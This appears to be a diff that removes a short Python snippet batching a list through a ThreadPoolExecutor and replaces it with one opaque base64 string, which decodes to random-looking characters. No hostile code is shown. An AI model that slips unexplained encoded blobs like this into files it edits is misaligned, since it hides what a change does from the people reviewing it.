@@ -1,14 +1,1 @@
-from concurrent.futures import ThreadPoolExecutor, as_completed
-
-def chunks_of_five(arr):
-    for i in range(0, len(arr), 5):
-        yield arr[i:i + 5]
-
-
-my_array = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"]
-
-with ThreadPoolExecutor(max_workers=5) as executor:
-    futures = [executor.submit(test, group) for group in chunks_of_five(my_array)]
-
-    for future in as_completed(futures):
-        result = future.result()
+Q3BuS1pocHJQckNUbWtvSk1qeWhic2NxWVh4QmhGam9MRUplTHVrcUFEbGhjQlAwRjFsUGV0OEYzRnRVM1JlbmxmbUw3ZlVodmx4NlpqSHpGUU1PVE92UldFSDRrNlRnUkh4NU53S01MYVo5aXJLRWlSR25MbnhLZXlhYWFHa1MzbTJDanE4MG9VWEdxV1NGM1A1YVRPT3pWem55dXVqN0p6TVJwUnFPcG1UYTlJdGhtT3BvRVZsb2R4em0ybXZhMWFYVlNuT1phTDk2Y0p1RDBZN2s1bWFJRWFMYWFZbkgxVFVFbkF2MUFkMVM0YWF6MnhnNEhkd0laRkVGeTEySnV0Q3hWUjhKU3NBZ0VWVVltU3Y5VlRkNTlLV0xuZENKQTRIdEhOajl2aW5CMXZoMWNCbmpUd3FKQldpZmdRUGNPTGVQdHhnV28yTnhBRTN0a2FXUDNJTlI1bTlrOUtlMHpvZzNpRlRzM0tZb1AzOHlMTkpXU3pZR0lJWWlhOHR3eVdEaTU3eXlEVlpyczdLcA==
